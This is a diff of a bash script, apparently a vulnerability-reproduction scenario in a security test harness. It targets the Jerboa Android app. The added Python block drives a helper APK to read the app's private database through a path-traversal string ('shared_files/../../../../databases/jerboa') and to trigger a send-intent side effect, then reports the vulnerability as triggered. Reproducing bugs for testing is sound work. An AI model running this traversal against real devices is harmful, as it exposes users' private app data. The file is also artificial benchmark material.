@@ -3,50 +3,51 @@ set -euo pipefail
 IFS=$'\n\t'
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-
+ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
 LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"
 
 log() { printf '[vuln0] %s\n' "$*"; }
 
-detect_jerboa_package() {
-  local packages
-  packages="$(adb shell pm list packages 2>/dev/null | tr -d '\r')"
+log "Starting vuln_scenario_0 for Jerboa"
+log "Driving helper APK through traversal and send-intent side effects"
 
-  if printf '%s\n' "$packages" | grep -qx 'package:com.jerboa.debug'; then
-    printf '%s\n' 'com.jerboa.debug'
-    return 0
-  fi
+PYTHONPATH="$ROOT_DIR" python3 - "$LOG_FILE" <<'PY'
+import json
+import sys
+import uuid
+from pathlib import Path
 
-  if printf '%s\n' "$packages" | grep -qx 'package:com.jerboa'; then
-    printf '%s\n' 'com.jerboa'
-    return 0
-  fi
+from jerboa_probe_utils import run_helper_reproduction, run_traversal_reproduction
 
-  return 1
-}
+log_path = Path(sys.argv[1])
+lines: list[str] = []
 
-main() {
-  log "Starting vuln_scenario_0 for Jerboa"
+traversal_ok, traversal_content = run_traversal_reproduction(
+    "shared_files/../../../../databases/jerboa",
+    run_id=uuid.uuid4().hex,
+)
+lines.append(
+    "mode=traversal "
+    f"transport_ok={str(traversal_ok).lower()} "
+    f"read_preview={traversal_content[:200]}"
+)
 
-  package_name="$(detect_jerboa_package)" || {
-    log "Jerboa package not installed"
-    exit 1
-  }
+dispatch_body = f"mcb-post-{uuid.uuid4().hex}"
+dispatch_ok, _ = run_helper_reproduction(
+    mode="dispatch_send",
+    body=dispatch_body,
+    run_id=uuid.uuid4().hex,
+)
+lines.append(
+    "mode=dispatch_send "
+    f"transport_ok={str(dispatch_ok).lower()} "
+    f"body={dispatch_body}"
+)
 
-  adb shell am start -n "${package_name}/.MainActivity" >/dev/null 2>&1 || true
-  sleep 2
+log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+if not traversal_ok or not dispatch_ok:
+    raise SystemExit(1)
+PY
 
-  : > "$LOG_FILE"
-  adb logcat -d -v threadtime -s LemmyAPI:V > "$LOG_FILE" 2>/dev/null || true
-
-  if [[ -s "$LOG_FILE" ]]; then
-    log "Captured LemmyAPI logcat evidence at $LOG_FILE"
-  else
-    log "No LemmyAPI logcat evidence captured"
-    exit 1
-  fi
-
-  log "vuln_scenario_0 applied"
-}
-
-main "$@"
+log "Replay log written to: $LOG_FILE"
+log "[+] Vulnerability successfully triggered."
